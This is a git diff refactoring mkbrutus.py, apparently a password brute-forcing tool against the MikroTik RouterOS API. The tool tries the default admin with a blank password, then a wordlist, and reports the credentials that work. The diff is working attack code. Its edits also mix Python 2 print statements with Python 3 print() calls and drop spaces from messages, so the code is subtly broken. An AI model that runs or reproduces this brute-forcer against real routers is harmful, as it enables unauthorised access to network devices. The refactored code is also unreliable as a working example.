@@ -19,17 +19,10 @@ Options:
 
 from docopt import docopt
 import sys
-import binascii
-import select
 import socket
 import time
 import signal
 import codecs
-
-
-def error(err):
-    print(err)
-    print("Try 'mkbrutus.py -h' or 'mkbrutus.py --help' for more information.")
 
 
 def signal_handler(signal, frame):
@@ -58,40 +51,52 @@ def main(args):
 
     # Get the number of lines in file
     count = 0
-    dictFile = codecs.open(args['<DICT>'],'rb', encoding='utf-8', errors='ignore')
+    dict_file = codecs.open(
+        args['<DICT>'],
+        'rb', encoding='utf-8',
+        errors='ignore'
+    )
     while 1:
-        buffer = dictFile.read(8192*1024)
-        if not buffer: break
+        buffer = dict_file.read(8192 * 1024)
+        if not buffer:
+            break
         count += buffer.count('\n')
-    dictFile.seek(0)
+    dict_file.seek(0)
 
     items = 1
-    for password in dictFile.readlines():
+    for password in dict_file.readlines():
         password = password.strip('\n\r ')
         s = None
-        for res in socket.getaddrinfo(args['<TARGET>'], args['--port'], socket.AF_UNSPEC, socket.SOCK_STREAM):
+        for res in socket.getaddrinfo(
+            args['<TARGET>'],
+            args['--port'],
+            socket.AF_UNSPEC,
+            socket.SOCK_STREAM
+        ):
             af, socktype, proto, canonname, sa = res
             try:
-                 s = socket.socket(af, socktype, proto)
-                 # Timeout threshold = 5 secs
-                 s.settimeout(5)
+                s = socket.socket(af, socktype, proto)
+                # Timeout threshold = 5 secs
+                s.settimeout(5)
             except (socket.error):
                 s = None
                 continue
             try:
-                 s.connect(sa)
+                s.connect(sa)
             except (socket.timeout):
                 print("[-] Target timed out! Exiting...")
                 s.close()
                 sys.exit(1)
             except (socket.error):
-                print("[-] SOCKET ERROR! Check Target (IP or PORT parameters). Exiting...")
+                err = "[-] SOCKET ERROR! Check Target (IP or PORT parameters)."
+                print err + "Exiting..."
                 s.close()
                 sys.exit(1)
-        dictFile.close(  )
+        dict_file.close()
+        # modify api here
         apiros = ApiRos(s)
 
-        # First of all, we'll try with RouterOS default credentials ("admin":"")
+        # First of all,we'll try with RouterOS default credentials ("admin":"")
         while defcredcheck:
             defaultcreds = apiros.login("admin", "")
             login = ''.join(defaultcreds[0][0])
@@ -100,11 +105,15 @@ def main(args):
             print()
 
             if login == "!done":
-                print ("[+] Login successful!!! Default RouterOS credentials were not changed. Log in with admin:<BLANK>")
+                alert = "[+] Login successful!!!"
+                alert += "Default RouterOS credentials were not changed."
+                print alert + "Log in with admin:<BLANK>"
                 sys.exit(0)
             else:
-                print("[-] Default RouterOS credentials were unsuccessful, trying with " + str(count) + " passwords in list...")
-                print("")
+                alert = "[-] Default RouterOS credentials were unsuccessful,"
+                alert += "trying with " + str(count) + " passwords in list..."
+                print alert
+                print ""
                 defcredcheck = False
                 time.sleep(1)
 
@@ -112,16 +121,21 @@ def main(args):
         login = ''.join(loginoutput[0][0])
 
         if not args['--quiet']:
-            print("[-] Trying " + str(items) + " of " + str(count) + " Paswords - Current: " + password)
-
+            alert = "[-] Trying {} of {} passwords".format(
+                str(items), str(count))
+            print alert + "- current" + password
         if login == "!done":
-            print("[+] Login successful!!! User: " + args['--user'] + " Password: " + password)
+            alert = "[+] Login successful!!!"
+            alert += "User: " + args['--user'] + " Password: " + password
+            print alert
             run(items)
             return
-        items +=1
+        items += 1
         time.sleep(int(args['--seconds']))
 
-    print("[*] ATTACK FINISHED! No suitable credentials were found. Try again with a different wordlist.")
+    alert = "[*] ATTACK FINISHED! No suitable credentials were found."
+    alert += "Try again with a different wordlist."
+    print alert
     run(count)
 
 
